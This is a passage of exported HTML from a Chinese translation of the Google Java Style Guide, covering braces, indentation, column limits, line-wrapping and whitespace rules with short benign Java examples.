face="&#23435;&#20307;"><span lang="zh-CN">&#21542;&#21017;&#19981;&#25442;&#34892;&#12290;</span></font></p></ul><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65292;&#22914;&#26524;&#21491;&#22823;&#25324;&#21495;&#21518;&#38754;&#26159;</span></font></font><font size="3" style="font-size: 12pt">else</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;&#36887;&#21495;&#65292;&#21017;&#19981;&#25442;&#34892;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31034;&#20363;&#65306;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">return<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>new<font face="Courier New, serif"><font size="2" style="font-size: 10pt">MyClass() {    _x000D_    </font></font>@Override<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>public void method() <font face="Courier New, serif"><font size="2" style="font-size: 10pt">{       _x000D_        </font></font>if<font face="Courier New, serif"><font size="2" style="font-size: 10pt">(condition()) {_x000D_            </font></font>try<font face="Courier New, serif"><font size="2" style="font-size: 10pt">{_x000D_                something();_x000D_            } </font></font>catch<font face="Courier New, serif"><font size="2" style="font-size: 10pt">(ProblemException e) {_x000D_                recover();_x000D_    }_x000D_        }_x000D_    }_x000D_};</font></font></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">4.8.1</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33410;&#32473;&#20986;&#20102;</span></font></font><font size="3" style="font-size: 12pt">enum</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#30340;&#19968;&#20123;&#20363;&#22806;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1493656653"></a>4.1.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31354;&#22359;&#65306;&#21487;&#20197;&#29992;&#31616;&#27905;&#29256;&#26412;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#20010;&#31354;&#30340;&#22359;&#29366;&#32467;&#26500;&#37324;&#20160;&#20040;&#20063;&#19981;&#21253;&#21547;&#65292;&#22823;&#25324;&#21495;&#21487;&#20197;&#31616;&#27905;&#22320;&#20889;&#25104;</span></font></font><font size="3" style="font-size: 12pt">{}</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#19981;&#38656;&#35201;&#25442;&#34892;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22806;&#65306;&#22914;&#26524;&#23427;&#26159;&#19968;&#20010;&#22810;&#22359;&#35821;&#21477;&#30340;&#19968;&#37096;&#20998;</span></font></font><font size="3" style="font-size: 12pt">(if/else</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;</span></font></font><font size="3" style="font-size: 12pt">try/catch/finally)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21363;&#20351;&#22823;&#25324;&#21495;&#20869;&#27809;&#20869;&#23481;&#65292;&#21491;&#22823;&#25324;&#21495;&#20063;&#35201;&#25442;&#34892;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31034;&#20363;&#65306;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">voiddoNothing() <font face="Courier New, serif"><font size="2" style="font-size: 10pt">{}</font></font></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1071128681"></a>4.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#22359;&#32553;&#36827;&#65306;</span></font>4<font face="&#23435;&#20307;"><span lang="zh-CN">&#20010;&#31354;&#26684;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27599;&#24403;&#24320;&#22987;&#19968;&#20010;&#26032;&#30340;&#22359;&#65292;&#32553;&#36827;&#22686;&#21152;</span></font></font><font size="3" style="font-size: 12pt">4</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#31354;&#26684;&#65292;&#24403;&#22359;&#32467;&#26463;&#26102;&#65292;&#32553;&#36827;&#36820;&#22238;&#20808;&#21069;&#30340;&#32553;&#36827;&#32423;&#21035;&#12290;&#32553;&#36827;&#32423;&#21035;&#36866;&#29992;&#20110;&#20195;&#30721;&#21644;&#27880;&#37322;&#12290;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35265;</span></font></font><font size="3" style="font-size: 12pt">4.1.2</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33410;&#20013;&#30340;&#20195;&#30721;&#31034;&#20363;</span></font></font><font size="3" style="font-size: 12pt">)</font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1176425987"></a>4.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#19968;&#34892;&#19968;&#20010;&#35821;&#21477;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27599;&#20010;&#35821;&#21477;&#21518;&#35201;&#25442;&#34892;&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1944456457"></a>4.4 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21015;&#38480;&#21046;&#65306;</span></font>80<font face="&#23435;&#20307;"><span lang="zh-CN">&#25110;</span></font>100</h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#20010;&#39033;&#30446;&#21487;&#20197;&#36873;&#25321;&#19968;&#34892;</span></font></font><font size="3" style="font-size: 12pt">80</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#23383;&#31526;&#25110;</span></font></font><font size="3" style="font-size: 12pt">100</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#23383;&#31526;&#30340;&#21015;&#38480;&#21046;&#65292;&#38500;&#20102;&#19979;&#36848;&#20363;&#22806;&#65292;&#20219;&#20309;&#19968;&#34892;&#22914;&#26524;&#36229;&#36807;&#36825;&#20010;&#23383;&#31526;&#25968;&#38480;&#21046;&#65292;&#24517;&#39035;&#33258;&#21160;&#25442;&#34892;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22806;&#65306;&#61623;</span></font></font></p><ul><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#19981;&#21487;&#33021;&#28385;&#36275;&#21015;&#38480;&#21046;&#30340;&#34892;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#20363;&#22914;&#65292;</span></font>Javadoc<font face="&#23435;&#20307;"><span lang="zh-CN">&#20013;&#30340;&#19968;&#20010;&#38271;</span></font>URL<font face="&#23435;&#20307;"><span lang="zh-CN">&#65292;&#25110;&#26159;&#19968;&#20010;&#38271;&#30340;</span></font>JSNI<font face="&#23435;&#20307;"><span lang="zh-CN">&#26041;&#27861;&#21442;&#32771;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;&#61623;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2">package<font face="&#23435;&#20307;"><span lang="zh-CN">&#21644;</span></font>import<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#35265;</span></font>3.2<font face="&#23435;&#20307;"><span lang="zh-CN">&#33410;&#21644;</span></font>3.3<font face="&#23435;&#20307;"><span lang="zh-CN">&#33410;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;&#61623;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#27880;&#37322;&#20013;&#37027;&#20123;&#21487;&#33021;&#34987;&#21098;&#20999;&#24182;&#31896;&#36148;&#21040;</span></font>shell<font face="&#23435;&#20307;"><span lang="zh-CN">&#20013;&#30340;&#21629;&#20196;&#34892;&#12290;</span></font></p></ul><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1196052324"></a>4.5 <font face="&#23435;&#20307;"><span lang="zh-CN">&#33258;&#21160;&#25442;&#34892;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26415;&#35821;&#35828;&#26126;&#65306;&#19968;&#33324;&#24773;&#20917;&#19979;&#65292;&#19968;&#34892;&#38271;&#20195;&#30721;&#20026;&#20102;&#36991;&#20813;&#36229;&#20986;&#21015;&#38480;&#21046;</span></font></font><font size="3" style="font-size: 12pt">(80</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;</span></font></font><font size="3" style="font-size: 12pt">100</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#23383;&#31526;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32780;&#34987;&#20998;&#20026;&#22810;&#34892;&#65292;&#25105;&#20204;&#31216;&#20043;&#20026;&#33258;&#21160;&#25442;&#34892;</span></font></font><font size="3" style="font-size: 12pt">(line-wrapping)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;&#25105;&#20204;&#24182;&#27809;&#26377;&#20840;&#38754;&#65292;&#30830;&#23450;&#24615;&#30340;&#20934;&#21017;&#26469;&#20915;&#23450;&#22312;&#27599;&#19968;&#31181;&#24773;&#20917;&#19979;&#22914;&#20309;&#33258;&#21160;&#25442;&#34892;&#12290;&#24456;&#22810;&#26102;&#20505;&#65292;&#23545;&#20110;&#21516;&#19968;&#27573;&#20195;&#30721;&#20250;&#26377;&#22909;&#20960;&#31181;&#26377;&#25928;&#30340;&#33258;&#21160;&#25442;&#34892;&#26041;&#24335;&#12290;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Tip:</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25552;&#21462;&#26041;&#27861;&#25110;&#23616;&#37096;&#21464;&#37327;&#21487;&#20197;&#22312;&#19981;&#25442;&#34892;&#30340;&#24773;&#20917;&#19979;&#35299;&#20915;&#20195;&#30721;&#36807;&#38271;&#30340;&#38382;&#39064;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">(</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26159;&#21512;&#29702;&#32553;&#30701;&#21629;&#21517;&#38271;&#24230;&#21543;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">)</font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc53450303"></a>4.5.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20174;&#21738;&#37324;&#26029;&#24320;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33258;&#21160;&#25442;&#34892;&#30340;&#22522;&#26412;&#20934;&#21017;&#26159;&#65306;&#26356;&#20542;&#21521;&#20110;&#22312;&#26356;&#39640;&#30340;&#35821;&#27861;&#32423;&#21035;&#22788;&#26029;&#24320;&#12290;</span></font></font></p><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;&#26524;&#22312;&#38750;&#36171;&#20540;&#36816;&#31639;&#31526;&#22788;&#26029;&#24320;&#65292;&#37027;&#20040;&#22312;&#35813;&#31526;&#21495;&#21069;&#26029;&#24320;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#27604;&#22914;</span></font>+<font face="&#23435;&#20307;"><span lang="zh-CN">&#65292;&#23427;&#23558;&#20301;&#20110;&#19979;&#19968;&#34892;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;&#27880;&#24847;&#65306;&#36825;&#19968;&#28857;&#19982;</span></font>Google <font face="&#23435;&#20307;"><span lang="zh-CN">&#20854;&#23427;&#35821;&#35328;&#30340;&#32534;&#31243;&#39118;&#26684;&#19981;&#21516;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;</span></font>C++ <font face="&#23435;&#20307;"><span lang="zh-CN">&#21644;</span></font>JavaScript )<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#36825;&#26465;&#35268;&#21017;&#20063;&#36866;&#29992;&#20110;&#20197;&#19979;</span></font>&quot;<font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#36816;&#31639;&#31526;</span></font>&quot;<font face="&#23435;&#20307;"><span lang="zh-CN">&#31526;&#21495;&#65306;&#28857;&#20998;&#38548;&#31526;</span></font>(.)<font face="&#23435;&#20307;"><span lang="zh-CN">&#65292;&#31867;&#22411;&#30028;&#38480;&#20013;&#30340;</span></font>&amp;<font face="&#23435;&#20307;"><span lang="zh-CN">&#65288;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#65292;</span></font>catch<font face="&#23435;&#20307;"><span lang="zh-CN">&#22359;&#20013;&#30340;&#31649;&#36947;&#31526;&#21495;</span></font>(catch(FooException | BarException e)</p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;&#26524;&#22312;&#36171;&#20540;&#36816;&#31639;&#31526;&#22788;&#26029;&#24320;&#65292;&#36890;&#24120;&#30340;&#20570;&#27861;&#26159;&#22312;&#35813;&#31526;&#21495;&#21518;&#26029;&#24320;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#27604;&#22914;</span></font>=<font face="&#23435;&#20307;"><span lang="zh-CN">&#65292;&#23427;&#19982;&#21069;&#38754;&#30340;&#20869;&#23481;&#30041;&#22312;&#21516;&#19968;&#34892;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;&#36825;&#26465;&#35268;&#21017;&#20063;&#36866;&#29992;&#20110;</span></font>foreach<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;&#20013;&#30340;&#20998;&#21495;&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#26041;&#27861;&#21517;&#25110;&#26500;&#36896;&#20989;&#25968;&#21517;&#19982;&#24038;&#25324;&#21495;&#30041;&#22312;&#21516;&#19968;&#34892;&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#36887;&#21495;</span></font>(,)<font face="&#23435;&#20307;"><span lang="zh-CN">&#19982;&#20854;&#21069;&#38754;&#30340;&#20869;&#23481;&#30041;&#22312;&#21516;&#19968;&#34892;&#12290;</span></font></p></ol><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc495977564"></a>4.5.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#33258;&#21160;&#25442;&#34892;&#26102;&#32553;&#36827;&#33267;&#23569;</span></font>+8<font face="&#23435;&#20307;"><span lang="zh-CN">&#20010;&#31354;&#26684;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33258;&#21160;&#25442;&#34892;&#26102;&#65292;&#31532;&#19968;&#34892;&#21518;&#30340;&#27599;&#19968;&#34892;&#33267;&#23569;&#27604;&#31532;&#19968;&#34892;&#22810;&#32553;&#36827;</span></font></font><font size="3" style="font-size: 12pt">8</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#31354;&#26684;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#24847;&#65306;&#21046;&#34920;&#31526;&#19981;&#29992;&#20110;&#32553;&#36827;&#12290;&#35265;</span></font></font><font size="3" style="font-size: 12pt">2.3.1</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33410;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;&#24403;&#23384;&#22312;&#36830;&#32493;&#33258;&#21160;&#25442;&#34892;&#26102;&#65292;&#32553;&#36827;&#21487;&#33021;&#20250;&#22810;&#32553;&#36827;&#19981;&#21482;</span></font></font><font size="3" style="font-size: 12pt">8</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#31354;&#26684;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#27861;&#20803;&#32032;&#23384;&#22312;&#22810;&#32423;&#26102;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;&#19968;&#33324;&#32780;&#35328;&#65292;&#20004;&#20010;&#36830;&#32493;&#34892;&#20351;&#29992;&#30456;&#21516;&#30340;&#32553;&#36827;&#24403;&#19988;&#20165;&#24403;&#23427;&#20204;&#24320;&#22987;&#20110;&#21516;&#32423;&#35821;&#27861;&#20803;&#32032;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31532;</span></font></font><font size="3" style="font-size: 12pt">4.6.3</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27700;&#24179;&#23545;&#40784;&#19968;&#33410;&#20013;&#25351;&#20986;&#65292;&#19981;&#40723;&#21169;&#20351;&#29992;&#21487;&#21464;&#25968;&#30446;&#30340;&#31354;&#26684;&#26469;&#23545;&#40784;&#21069;&#38754;&#34892;&#30340;&#31526;&#21495;&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc46436563"></a>4.6 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31354;&#30333;</span></font></h2><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc957349860"></a>4.6.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#22402;&#30452;&#31354;&#30333;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20197;&#19979;&#24773;&#20917;&#38656;&#35201;&#20351;&#29992;&#19968;&#20010;&#31354;&#34892;&#65306;</span></font></font></p><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#20869;&#36830;&#32493;&#30340;&#25104;&#21592;&#20043;&#38388;&#65306;&#23383;&#27573;&#65292;&#26500;&#36896;&#20989;&#25968;&#65292;&#26041;&#27861;&#65292;&#23884;&#22871;&#31867;&#65292;&#38745;&#24577;&#21021;&#22987;&#21270;&#22359;&#65292;&#23454;&#20363;&#21021;&#22987;&#21270;&#22359;&#12290;&#20363;&#22806;&#65306; &#20004;&#20010;&#36830;&#32493;&#23383;&#27573;&#20043;&#38388;&#30340;&#31354;&#34892;&#26159;&#21487;&#36873;&#30340;&#65292;&#29992;&#20110;&#23383;&#27573;&#30340;&#31354;&#34892;&#20027;&#35201;&#29992;&#26469;&#23545;&#23383;&#27573;&#36827;&#34892;&#36923;&#36753;&#20998;&#32452;&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22312;&#20989;&#25968;&#20307;&#20869;&#65292;&#35821;&#21477;&#30340;&#36923;&#36753;&#20998;&#32452;&#38388;&#20351;&#29992;&#31354;&#34892;&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#20869;&#30340;&#31532;&#19968;&#20010;&#25104;&#21592;&#21069;&#25110;&#26368;&#21518;&#19968;&#20010;&#25104;&#21592;&#21518;&#30340;&#31354;&#34892;&#26159;&#21487;&#36873;&#30340;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#26082;&#19981;&#40723;&#21169;&#20063;&#19981;&#21453;&#23545;&#36825;&#26679;&#20570;&#65292;&#35270;&#20010;&#20154;&#21916;&#22909;&#32780;&#23450;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#35201;&#28385;&#36275;&#26412;&#25991;&#26723;&#20013;&#20854;&#20182;&#33410;&#30340;&#31354;&#34892;&#35201;&#27714;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#27604;&#22914;</span></font>3.3<font face="&#23435;&#20307;"><span lang="zh-CN">&#33410;&#65306;</span></font>import<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</span></font>)</p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22810;&#20010;&#36830;&#32493;&#30340;&#31354;&#34892;&#26159;&#20801;&#35768;&#30340;&#65292;&#20294;&#27809;&#26377;&#24517;&#35201;&#36825;&#26679;&#20570;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#25105;&#20204;&#20063;&#19981;&#40723;&#21169;&#36825;&#26679;&#20570;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p></ol><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1844432375"></a>4.6.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27700;&#24179;&#31354;&#30333;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38500;&#20102;&#35821;&#35328;&#38656;&#27714;&#21644;&#20854;&#23427;&#35268;&#21017;&#65292;&#24182;&#19988;&#38500;&#20102;&#25991;&#23383;&#65292;&#27880;&#37322;&#21644;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#29992;&#21040;&#21333;&#20010;&#31354;&#26684;&#65292;&#21333;&#20010;</span></font></font><font size="3" style="font-size: 12pt">ASCII</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31354;&#26684;&#20063;&#20986;&#29616;&#22312;&#20197;&#19979;&#20960;&#20010;&#22320;&#26041;&#65306;</span></font></font></p><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#20998;&#38548;&#20219;&#20309;&#20445;&#30041;&#23383;&#19982;&#32039;&#38543;&#20854;&#21518;&#30340;&#24038;&#25324;&#21495;</span></font>(()(<font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;</span></font>if,for catch<font face="&#23435;&#20307;"><span lang="zh-CN">&#31561;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#20998;&#38548;&#20219;&#20309;&#20445;&#30041;&#23383;&#19982;&#20854;&#21069;&#38754;&#30340;&#21491;&#22823;&#25324;&#21495;</span></font>(})(<font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;</span></font>else,catch)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22312;&#20219;&#20309;&#24038;&#22823;&#25324;&#21495;&#21069;</span></font>({)<font face="&#23435;&#20307;"><span lang="zh-CN">&#65292;&#20004;&#20010;&#20363;&#22806;&#65306;</span></font><br>o@SomeAnnotation({a, b})(<font face="&#23435;&#20307;"><span lang="zh-CN">&#19981;&#20351;&#29992;&#31354;&#26684;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font><br>oString[][] x = foo;(<font face="&#23435;&#20307;"><span lang="zh-CN">&#22823;&#25324;&#21495;&#38388;&#27809;&#26377;&#31354;&#26684;&#65292;&#35265;&#19979;&#38754;&#30340;</span></font>Note)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22312;&#20219;&#20309;&#20108;&#20803;&#25110;&#19977;&#20803;&#36816;&#31639;&#31526;&#30340;&#20004;&#20391;&#12290;&#36825;&#20063;&#36866;&#29992;&#20110;&#20197;&#19979;</span></font>&quot;<font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#36816;&#31639;&#31526;</span></font>&quot;<font face="&#23435;&#20307;"><span lang="zh-CN">&#31526;&#21495;&#65306;</span></font><br>o<font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#22411;&#30028;&#38480;&#20013;&#30340;</span></font>&amp;()<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font><br>ocatch<font face="&#23435;&#20307;"><span lang="zh-CN">&#22359;&#20013;&#30340;&#31649;&#36947;&#31526;&#21495;</span></font>(catch(FooException | BarException e)<font face="&#23435;&#20307;"><span lang="zh-CN">&#12290;</span></font><br>oforeach<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;&#20013;&#30340;&#20998;&#21495;&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22312;</span></font>,: ;<font face="&#23435;&#20307;"><span lang="zh-CN">&#21450;&#21491;&#25324;&#21495;</span></font>())<font face="&#23435;&#20307;"><span lang="zh-CN">&#21518;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;&#26524;&#22312;&#19968;&#26465;&#35821;&#21477;&#21518;&#20570;&#27880;&#37322;&#65292;&#21017;&#21452;&#26012;&#26464;</span></font>(//)<font face="&#23435;&#20307;"><span lang="zh-CN">&#20004;&#36793;&#37117;&#35201;&#31354;&#26684;&#12290;&#36825;&#37324;&#21487;&#20197;&#20801;&#35768;&#22810;&#20010;&#31354;&#26684;&#65292;&#20294;&#27809;&#26377;&#24517;&#35201;&#12290;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font 